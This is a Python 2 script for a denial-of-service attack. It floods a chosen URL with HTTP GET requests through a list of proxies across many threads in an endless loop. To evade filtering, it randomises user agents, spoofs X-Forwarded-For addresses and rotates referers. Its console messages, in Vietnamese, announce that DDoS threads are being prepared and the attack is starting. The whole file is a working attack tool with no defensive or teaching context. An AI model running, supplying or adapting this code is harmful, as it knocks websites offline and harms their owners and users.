#!/usr/bin/env python
#coding: utf8
 
import random
import socket
import threading
import time
from sys import argv

userAgents = [
      "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
      "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
      "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
      "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
      "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
      "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
      "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
      "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
      "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
      "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
      "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
      "HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
      "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
      "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
      "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
      "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",]
 
reFerers = [
        "https://w...content-available-to-author-only...m.vn/?gws_rd=ssl#q=",
        "http://y...content-available-to-author-only...x.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..",
        "http://c...content-available-to-author-only...y.com/profile.php?redirect=",
        "http://w...content-available-to-author-only...y.com/search/results?q=",
        "http://y...content-available-to-author-only...x.ru/yandsearch?text=",
        "http://g...content-available-to-author-only...l.ru/search?mail.ru=1&q=",
        "http://n...content-available-to-author-only...r.ru/search?=btnG?=%D0?2?%D0?2?%=D0..",
        "http://r...content-available-to-author-only...a.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..",
        "http://r...content-available-to-author-only...o.com/search;_yzt=?=A7x9Q.bs67zf..",
        "http://r...content-available-to-author-only...o.com/search;?_query?=l%t=?=?A7x..",
        "http://g...content-available-to-author-only...l.ru/search?gay.ru.query=1&q=?abc.r..",
        "http://n...content-available-to-author-only...r.ru/search?btnG=%D0%9D%?D0%B0%D0%B..",
        "http://w...content-available-to-author-only...e.ru/url?sa=t&rct=?j&q=&e..",
        "http://h...content-available-to-author-only...u.com/searchResult?keywords=",
        "http://w...content-available-to-author-only...g.com/search?q=",
        "https://w...content-available-to-author-only...x.com/yandsearch?text=",
        "https://d...content-available-to-author-only...o.com/?q=",
        "http://w...content-available-to-author-only...k.com/web?q=",
        "http://s...content-available-to-author-only...l.com/aol/search?q=",
        "https://w...content-available-to-author-only...m.nl/vaste-onderdelen/zoeken/?zoeken_term=",
        "http://v...content-available-to-author-only...3.org/feed/check.cgi?url=",
        "http://h...content-available-to-author-only...r.com/check_page/?furl=",
        "http://w...content-available-to-author-only...r.com/url/translation.aspx?direction=er&sourceURL=",
        "http://j...content-available-to-author-only...3.org/css-validator/validator?uri=",
        "https://a...content-available-to-author-only...o.com/rss?url=",
        "http://e...content-available-to-author-only...l.com/search?q=",
        "https://s...content-available-to-author-only...y.com/market/search?q=",
        "http://f...content-available-to-author-only...o.com/search?q=",
        "http://w...content-available-to-author-only...t.com/site/pinterest.com/search?q=",
        "http://e...content-available-to-author-only...e.net/wow/en/search?q=",
        "http://e...content-available-to-author-only...l.com/search?q=",
        "http://c...content-available-to-author-only...n.org/search?q=",
        "http://t...content-available-to-author-only...t.edu/search?q=",
        "http://w...content-available-to-author-only...m.tv/search?q=",
        "http://w...content-available-to-author-only...d.com/search?q=",
        "http://f...content-available-to-author-only...a.com/search?q=",
        "http://i...content-available-to-author-only...h.io/search?q=",
        "http://j...content-available-to-author-only...s.com/jobs/search?q=",
        "http://t...content-available-to-author-only...p.org/search?q=",
        "http://w...content-available-to-author-only...m.vn/news/vn/search&q=",
        "https://play.google.com/store/search?q=",
        "http://w...content-available-to-author-only...s.gov/@@tceq-search?q=",
        "http://w...content-available-to-author-only...t.com/search?q=",
        "http://w...content-available-to-author-only...r.com/events/search?q=",
        "https://c...content-available-to-author-only...e.org/search?q=",
        "http://j...content-available-to-author-only...s.com/search?q=",
        "http://j...content-available-to-author-only...g.com/search?q=",
        "https://w...content-available-to-author-only...t.com/search/?q=",
        "http://m...content-available-to-author-only...r.org/search?q=",
        "https://w...content-available-to-author-only...s.com/search?q=",
        "http://w...content-available-to-author-only...s.uk/search?q=",
        "http://w...content-available-to-author-only...q.com/search?q="]       
 




 
def randomIp():
    random.seed()
    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254)) + '.'
    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
    return result
 
def randomIpList():
    random.seed()
    res = ""
    for ip in xrange(random.randint(2, 8)):
        res = res + randomIp() + ", "
    return res[0:len(res) - 2]
 
def randomUserAgent():
    return random.choice(userAgents)
 
def randomReFerer():
    return random.choice(reFerers)
 
def randomKeyWord():
    return random.choice(["sex","World Cup","Singer","ISIS", "xyz","abc","Facebook","Anonymous"])
 
class attacco(threading.Thread):
    def run(self):
        current = x
 
        if current < len(listaproxy):
            proxy = listaproxy[current].split(':')
        else:
            proxy = random.choice(listaproxy).split(':')
 
        useragent = "User-Agent: " + randomUserAgent() + "\r\n"
        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
        referer   = "Referer: "+ randomReFerer() + randomKeyWord() + "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
        while nload:
            time.sleep(1)
 
        while 1:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest)
                try:
                    for i in xrange(3):
                        a.send(httprequest)
                except:
                    tts = 1
 
 
            except:
                proxy = random.choice(listaproxy).split(':')
 
 
 

 
# Site

if '--url' in argv:
  url = argv[argv.index('--url')+1]



host_url = url.replace("http://", "").replace("https://", "").split('/')[0]


if '--proxy' in argv:
  file = argv[argv.index('--proxy')+1]

#Proxy
in_file = open(file,"r")
proxyf = in_file.read()
in_file.close() 
listaproxy = proxyf.split('\n')
#So luong


if '--thread' in argv:
  thread = int(argv[argv.index('--thread')+1])



get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
nload = 1
x = 0
 
for x in xrange(thread):
    attacco().start()
    time.sleep(0.003)
    print "Dang chuan bi luong Ddos " + str(x) + "!"
print "Dang Bat Dau Tan Cong..."
nload = 0
while not nload:
    time.sleep(1)